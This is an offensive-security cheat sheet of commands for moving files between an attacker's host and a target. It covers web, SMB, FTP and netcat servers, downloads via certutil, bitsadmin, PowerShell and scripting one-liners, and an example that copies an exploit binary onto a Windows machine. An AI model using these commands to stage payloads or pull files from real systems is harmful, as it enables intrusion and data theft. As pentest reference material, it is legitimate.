# Shell File Transfer Cheat Sheet
## [https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ ](https://steflan-security.com/shell-file-transfer-cheat-sheet/)
### Hosting files
| Command  | Description |
| ------------- | ------------- |
| python -m SimpleHTTPServer [PORT] | Python HTTP Server modules |
| python3 -m http.server [PORT]	| Python HTTP Server modules |
| service apache2 start; systemctl start apache2;	| Apache web server, requires to place files in the /var/www/html/ directory |
| service nginx start; systemctl start nginx	| Nginx web server, requires to place files in or /usr/share/nginx/html or /var/www/html |
| php -S 0.0.0.0:PORT	| PHP builtin web server bundle |
| nc -q 0 -lvp 443 < file	| Netcat listener to transfer files |
| nc -nv IP_ADDR 443 < file	| Netcat command to send files |
| smbserver.py SHARE share_dir	| Impacket’s smbserver.py script simulates a SMB server |
| service smbd start; systemctl start smbd	| Linux Samba, a share has to be added to /etc/samba/smb.conf |
| service pure-ftpd start; systemctl start pure-ftpd; service proftpd start; systemctl start proftpd	| Services such as pure-ftpd and proftpd can be used to setup FTP servers |
| atftpd –daemon –port 69 ftp_dir	| The atftpd utility allows to easily setup a TFTP server |
| ruby -rwebrick -e’WEBrick::HTTPServer.new(:Port => PORT, :DocumentRoot => Dir.pwd).start’	| Ruby web server using the Web brick library |
| ruby -run -e httpd . -p [PORT]	| Ruby simple http server |
| “C:\Program Files (x86)\IIS Express\iisexpress.exe” /path:C: /port:PORT	| Microsoftg IIS Express |
| base64 file;	| Encoding the the file using base 64 and decoding it in the target machine |

#### Downloading files
| Command  | Description |
| ------------- | ------------- |
| wget http://ip-addr:port/file [-o output_file]	| Wget comes preinstalled with most Linux systems |
| curl http://ip-addr:port/file -o output_file	| Curl comes preinstalled with most Linux and some Windows systems |
| certutil -urlcache -split -f “http://ip-addr:port/file” output_file	| Certutil is a Windows builtin command line tool |
| powershell -c Invoke-WebRequest -Uri http://ip-addr:port/file -OutFile output_file; | Powershell Invoke-WebRequest cmdlet or the System.Net.WebClient class |
| powershell -c (New-Object Net.WebClient).DownloadFile(‘http://ip-addr:port/file’, ‘output_file’)	| Powershell Invoke-WebRequest cmdlet or the System.Net.WebClient class |
| bitsadmin /transfer job /download /priority high http://IP_ADDR/file output_file	| Bitsadmin Windows command-line tool |
| nc -nv IP_ADDR 443 > file	| Netcat command to download files from a Netcat listener |
| nc -q 0-lvp 443 > file	| Netcat listener to receive files |
| copy \IP_ADDR\SHARE\output_file	| Copy command to download files from an SMB share |
| smbget smb://domain;user[:password@]server/share/path/file	| smbget utility to download files from a Samba share |
| wget ftp://user:password@IP_ADDR/path/file -o output_file | wget stuff via FTP |
| - FTP | FTP |
| echo open 192.168.1.64 21> ftp.txt | FTP |
| echo anonymous>> ftp.txt | FTP |
| echo ftp@ftp.com>> ftp.txt | FTP |
| echo bin >> ftp.txt | FTP |
| echo get test.txt >> ftp.txt | FTP |
| echo bye >> ftp.txt | FTP |
| ftp -s:ftp.txt	| Wget and FTP to download files from an FTP server |
| tftp |	tftp -i IP_ADDR {GET | PUT} file |
| scp /path/file username@IP_ADDR:/path/file	| Secure File Copy SSH tool |
| https://gist.github.com/Richienb/51021a1c16995a07478dfa20a6db725c	| Windows Virtual Basic scripts |
| php -r “file_put_contents(‘output_file’, fopen(‘http://ip-addr:port/file’, ‘r’));”	| PHP file_put_contents function |
| python -c ‘from urllib import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’; | The Python urlretrieve function which is part of the urllib library can be used to download files |
| python3 -c ‘from urllib.request import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’	| The Python urlretrieve function which is part of the urllib library can be used to download files |
| perl -MLWP::Simple -e ‘getstore(“http://IP_ADDR/file”, “out_file”)’; | Library for WWW in Perl |
| perl -e ‘use LWP::Simple; getstore(“http://IP_ADDR/file”, “out_file”)’	| Library for WWW in Perl |
| ruby -e ‘require “open-uri”;File.open(“output_file”, “wb”) do \|file\|;URI.open(“http://ip-addr:port/file”).read;end’	| Ruby Open-URI library |
| echo -n “base64-output” > file	| Decoding the base64 output of the file |

## Windows File Transfers with SMB
- https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html
```bash
#on kali
impacket-smbserver.py shareName sharePath

#on windows
##connect
C:\>net use
C:\>net use \\[host]\[share name]
##copy
C:\WINDOWS\Temp>copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe
```
